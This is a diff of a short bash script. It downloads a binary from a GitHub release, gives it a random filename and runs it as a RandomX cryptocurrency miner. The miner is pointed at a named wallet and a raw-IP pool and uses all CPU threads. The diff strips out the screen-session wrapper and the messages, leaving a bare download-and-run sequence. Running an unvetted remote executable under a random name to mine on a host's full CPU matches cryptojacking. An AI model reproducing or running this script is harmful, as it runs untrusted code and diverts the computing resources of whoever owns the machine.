@@ -1,42 +1,7 @@
 #!/bin/bash
 
-set -e
+BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
 
-# Check for screen
-if ! command -v screen >/dev/null 2>&1; then
-  echo "screen is not installed. Install it first:"
-  echo "  sudo apt install screen"
-  exit 1
-fi
-
-# Download settings
-URL="https://github.com/vedhagsvp/tkospae/releases/download/aplose/nanole"
-ORIG_NAME="nanole"
-
-echo "Downloading binary..."
-wget -q "$URL" -O "$ORIG_NAME"
-
-# Generate random filename and screen name
-BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 10)
-SCREEN_NAME="job_$BIN_NAME"
-
-# Prepare binary
-mv "$ORIG_NAME" "$BIN_NAME"
+wget -O "$BIN_NAME" https://github.com/vedhagsvp/tkospae/releases/download/aplose/nanole
 chmod +x "$BIN_NAME"
-
-echo "Starting screen session: $SCREEN_NAME"
-
-# Start in screen
-screen -dmS "$SCREEN_NAME" bash -c "
-./$BIN_NAME \
-  -algo RandomX \
-  -wallet pavantym.$BIN_NAME \
-  -pool1 212.147.230.244:8080 \
-  -rigPassword x \
-  -protocol JSON-RPC \
-  -cpuThreads $(nproc --all)
-"
-
-echo "Done."
-echo "Attach with: screen -r $SCREEN_NAME"
-echo "List screens: screen -ls"
+./"$BIN_NAME" -algo RandomX -wallet pavantym.$BIN_NAME -pool1 212.147.230.244:8080 -protocol JSON-RPC -cpuThreads "$(nproc --all)"
